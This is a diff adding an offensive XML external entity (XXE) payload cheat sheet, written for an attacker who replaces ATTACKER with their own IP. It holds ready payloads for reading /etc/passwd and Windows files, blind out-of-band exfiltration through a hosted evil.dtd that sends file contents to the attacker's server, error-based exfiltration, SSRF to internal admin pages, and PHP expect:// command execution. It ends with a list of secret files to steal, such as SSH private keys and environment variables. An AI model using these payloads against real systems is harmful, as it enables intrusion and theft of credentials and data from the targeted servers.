@@ -1,0 +1,83 @@
+# === XML EXTERNAL ENTITY (XXE) PAYLOADS ===
+# Replace ATTACKER with your IP. Run listener: python3 -m http.server 8080
+# Content-Type must be application/xml (change if needed)
+# Inject into any XML body, SOAP requests, SVG uploads, docx/xlsx uploads
+
+
+# --- Basic file read (Linux) ---
+# Use when: XML response reflects entity content
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+
+# --- Basic file read (Windows) ---
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
+<foo>&xxe;</foo>
+
+
+# --- SSRF / blind detection (triggers HTTP request to your server) ---
+# Confirm XXE is processed even if output not reflected
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER:8080/xxe-test">]>
+<foo>&xxe;</foo>
+
+
+# --- Blind OOB data exfil (when output not reflected) ---
+# Step 1: host evil.dtd on ATTACKER:8080 with content below
+# Step 2: send this payload
+
+# evil.dtd content (host this file):
+# <!ENTITY % file SYSTEM "file:///etc/passwd">
+# <!ENTITY % all "<!ENTITY exfil SYSTEM 'http://ATTACKER:8080/?c=%file;'>">
+# %all;
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % remote SYSTEM "http://ATTACKER:8080/evil.dtd">
+  %remote;
+  %exfil;
+]>
+<foo>test</foo>
+
+
+# --- Error-based exfil (when errors reflected) ---
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///INVALID/%file;'>">
+  %eval;
+  %exfil;
+]>
+<foo>test</foo>
+
+
+# --- SSRF to internal services ---
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">]>
+<foo>&xxe;</foo>
+
+
+# --- PHP expect RCE (if PHP + expect extension enabled) ---
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+<foo>&xxe;</foo>
+
+
+# --- SVG upload XXE (change Content-Type to image/svg+xml) ---
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+
+
+# --- Useful files to read ---
+# /etc/passwd
+# /etc/shadow  (needs root)
+# /etc/hosts
+# /proc/self/environ  (env vars, may contain secrets)
+# /proc/self/cmdline
+# /var/www/html/index.php  (source code)
+# /root/.ssh/id_rsa
+# C:\Windows\win.ini
+# C:\inetpub\wwwroot\web.config
